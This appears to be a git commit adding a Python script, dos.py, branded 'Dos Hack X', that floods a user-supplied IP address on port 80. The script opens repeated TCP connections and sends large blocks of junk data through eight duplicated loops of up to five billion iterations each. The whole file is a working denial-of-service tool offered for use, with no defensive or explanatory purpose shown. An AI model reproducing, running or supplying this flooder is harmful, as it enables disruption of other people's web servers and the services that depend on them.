2d412dac9e40b26f50c0813b3e645e97d5eefb6b
Hack X <81362734+HackX07164@users.noreply.github.com>
2021-09-07 10:53:44 +0200

    Add files via upload

---
+++ dos.py
@@ -0,0 +1,121 @@
+import os,sys,time,socket
+os.system ("clear")
+BB = "\033[34;1m" # Blue light
+YY = "\033[33;1m" # Yellow light
+GG = "\033[32;1m" # Green light
+WW = "\033[0;1m"  # White light
+RR = "\033[31;1m" # Red light
+CC = "\033[36;1m" # Cyan light
+B = "\033[34m"    # Blue
+Y = "\033[33m"    # Yellow
+G = "\033[32m"    # Green
+W = "\033[0m"     # White
+R = "\033[31m"    # Red
+print("""\033[96m┌───────────────────────────────────────────────┐
+│                                               │
+│ ██████╗  ██████╗ ███████╗    ██╗  ██╗██╗  ██╗ │
+│ ██╔══██╗██╔═══██╗██╔════╝    ██║  ██║╚██╗██╔╝ │
+│ ██║  ██║██║   ██║███████╗    ███████║ ╚███╔╝  │
+│ ██║  ██║██║   ██║╚════██║    ██╔══██║ ██╔██╗  │
+│ ██████╔╝╚██████╔╝███████║    ██║  ██║██╔╝ ██╗ │
+│ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ │
+│                                Dos Hack X     │
+└───────────────────────────────────────────────┘""")
+print("")
+ip=input(Y+'Enter ip : ')
+print(G+'Doos in',ip)
+for h in range(5000000000):
+  try:
+      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
+      socket.setdefaulttimeout(1)
+      Jmeel=knig.connect((ip,80))
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
+      data=data.encode("utf-8")
+      knig.send(data)      
+      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',CC,'port [80]')
+  except :
+    print(R+"no Doos in ip ",ip)
+print(G+'Doos in',ip)
+for h in range(5000000000):
+  try:
+      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
+      socket.setdefaulttimeout(1)
+      Jmeel=knig.connect((ip,80))
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
+      data=data.encode("utf-8")
+      knig.send(data)      
+      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',CC,'port [80]')
+  except :
+    print(R+"no Doos in ip ",ip)
+print(G+'Doos in',ip)
+for h in range(5000000000):
+  try:
+      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
+      socket.setdefaulttimeout(1)
+      Jmeel=knig.connect((ip,80))
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
+      data=data.encode("utf-8")
+      knig.send(data)      
+      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',CC,'port [80]')
+  except :
+    print(R+"no Doos in ip ",ip)
+print(G+'Doos in',ip)
+for h in range(5000000000):
+  try:
+      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
+      socket.setdefaulttimeout(1)
+      Jmeel=knig.connect((ip,80))
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
+      data=data.encode("utf-8")
+      knig.send(data)      
+      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',CC,'port [80]')
+  except :
+    print(R+"no Doos in ip ",ip)
+print(G+'Doos in',ip)
+for h in range(5000000000):
+  try:
+      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
+      socket.setdefaulttimeout(1)
+      Jmeel=knig.connect((ip,80))
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
+      data=data.encode("utf-8")
+      knig.send(data)      
+      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',CC,'port [80]')
+  except :
+    print(R+"no Doos in ip ",ip)
+print(G+'Doos in',ip)
+for h in range(5000000000):
+  try:
+      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
+      socket.setdefaulttimeout(1)
+      Jmeel=knig.connect((ip,80))
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
+      data=data.encode("utf-8")
+      knig.send(data)      
+      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',CC,'port [80]')
+  except :
+    print(R+"no Doos in ip ",ip)
+print(G+'Doos in',ip)
+for h in range(5000000000):
+  try:
+      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
+      socket.setdefaulttimeout(1)
+      Jmeel=knig.connect((ip,80))
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
+      data=data.encode("utf-8")
+      knig.send(data)      
+      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',CC,'port [80]')
+  except :
+    print(R+"no Doos in ip ",ip)
+print(G+'Doos in',ip)
+for h in range(5000000000):
+  try:
+      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
+      socket.setdefaulttimeout(1)
+      Jmeel=knig.connect((ip,80))
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
+      data=data.encode("utf-8")
+      knig.send(data)      
+      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',CC,'port [80]')
+  except :
+    print(R+"no Doos in ip ",ip)
